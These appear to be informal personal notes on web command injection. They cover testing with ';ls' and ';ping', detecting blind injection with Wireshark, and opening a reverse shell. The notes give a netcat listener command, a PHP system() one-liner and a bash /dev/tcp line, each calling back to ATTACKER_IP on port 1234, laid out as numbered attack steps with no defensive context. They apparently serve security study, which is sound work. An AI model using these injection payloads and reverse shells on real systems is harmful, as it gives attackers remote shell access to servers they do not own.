;ls 

blind command inject

it does not output so we use wireshark ;ping something 
if wireshark have response means it is blind cmd injection

and tips
if we found the website show smtg similar to tool we use it might vulnerable to command injection

To make website inject using own linux terminal 

1)nc -lvp (listening to any interface on port ) -p 1234
-l → listen mode
-v → verbose (show connections)
-n → no DNS lookup (faster)

2)just foofle php reverseshelll cmd eg.

PHP one-liner:
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'"); ?>

Or

if you can directly run commands (RCE):
bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1


Replace ATTACKER_IP with your real attacking machine’s IP, same port 1234.

3)reverse shello= opened
